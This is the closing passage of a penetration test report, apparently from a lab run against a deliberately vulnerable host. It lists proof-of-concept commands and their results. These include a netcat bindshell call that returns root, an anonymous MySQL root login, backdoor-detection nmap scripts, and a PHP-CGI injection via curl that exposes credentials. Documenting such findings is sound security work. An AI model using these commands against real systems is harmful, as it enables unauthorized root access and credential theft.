| VULN-002 | `echo 'id' \| nc -w 5 10.1.1.25 1524` | uid=0(root) gid=0(root) groups=0(root) |
| VULN-003 | VNC DES auth test with password 'password' | Auth result: SUCCESS (auth=0) |
| VULN-004 | `mysql -h 10.1.1.25 -u root --skip-ssl` | root@10.1.1.13, 7 databases enumerated |
| VULN-005 | `showmount -e 10.1.1.25` | Export list: / * |
| VULN-006 | `nmap --script irc-unrealircd-backdoor` | "Looks like trojaned version of unrealircd" |
| VULN-007 | `nmap --script distcc-cve2004-2687` | uid=1(daemon) gid=1(daemon) |
| VULN-008 | `smbclient -L //10.1.1.25 -N` | Anonymous login, 33 users, signing disabled |
| VULN-009 | `nmap --script ajp-headers -p 8009` | AJP responsive, Tomcat 5.5 confirmed |
| VULN-010 | `curl "http://10.1.1.25/?-s"` | PHP source + msfadmin/msfadmin credentials |

**Evidence Directory**: `engagements/DryRun_2026-02-19_WebApp/08-evidence/`
**Exploitation Results File**: `engagements/DryRun_2026-02-19_WebApp/06-exploitation/exploitation-results.md`

---

## 7. Tool Versions

| Tool | Version | Purpose |
|------|---------|---------|
| Nmap | 7.98 | Port scanning, service detection, NSE scripting |
| smbclient | Samba suite | SMB share enumeration |
| mysql client | Current | MySQL unauthenticated access test |
| netcat (nc) | OpenBSD netcat | Bindshell POC, raw TCP |
| curl | Current | HTTP PHP-CGI argument injection test |
| showmount | NFS utils | NFS export enumeration |
| Python 3 | 3.x | VNC auth DES test |
| Metasploit Framework | Current | Module reference (not executed in POC) |

---

*Technical Report generated by ATHENA Security Platform — 2026-02-19*
*Methodology: PTES | Non-destructive validation | Safe POC commands only*
*No data exfiltrated. No files modified. No persistence established.*
